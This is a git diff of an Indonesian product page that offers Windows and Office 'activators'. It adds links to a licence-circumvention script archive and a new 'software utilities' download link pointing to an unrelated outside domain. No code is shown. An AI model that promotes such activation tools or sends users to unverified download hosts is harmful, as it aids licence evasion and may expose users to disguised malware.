@@ -22,24 +22,25 @@
 
 ## 📦 Produk Kami
 
-1. **Windows Activator**  
-   - Aktivasi permanen Windows 10/11
+1. **Windows Activator**
+   - [Download Aktivasi permanen Windows 10/11](https://github.com/massgravel/Microsoft-Activation-Scripts/archive/refs/heads/master.zip)
    - Support semua versi build
 
-2. **Office Toolkit**  
-   - Aktivasi Microsoft Office
+2. **Office Toolkit**
+   - [Aktivasi Microsoft Office](https://github.com/massgravel/Microsoft-Activation-Scripts/archive/refs/heads/master.zip)
    - Fitur repair instalasi
 
 3. **Troubleshooting Guide**  
-   - Solusi error Windows umum
-   - Perbaikan sistem otomatis
+   - [Solusi error Windows umum](fix_powershell)
+   - [Perbaikan sistem otomatis](fix-wpa-registry)
 
 ---
 
 
 ## 🚀 Mulai Sekarang
+#### 📂 Daftar Software Lengkap
+   - [Download Software Utilities](https://apis.devcomp.fun/)
 
-[Download Sekarang](https://github.com/massgravel/Microsoft-Activation-Scripts/archive/refs/heads/master.zip) | [Dokumentasi](troubleshoot)
 
 ---
 
